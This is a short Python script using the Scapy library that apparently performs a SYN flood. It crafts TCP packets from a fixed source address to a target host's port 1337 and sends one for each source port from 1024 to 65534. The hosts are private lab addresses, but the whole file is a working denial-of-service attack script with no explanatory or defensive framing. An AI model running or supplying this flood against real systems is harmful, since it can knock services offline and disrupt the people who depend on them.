from scapy.all import *
from scapy.layers.inet import TCP, IP


def syncflooding(srcip, tgtip):
    for sourceport in range(1024, 65535):
        layer3 = IP(src=srcip, dst=tgtip)
        layer4 = TCP(sport=sourceport, dport=1337)
        packet = layer3/layer4
        send(packet)
src = "10.0.3.2"
dst = "10.0.2.2"

syncflooding(src, dst)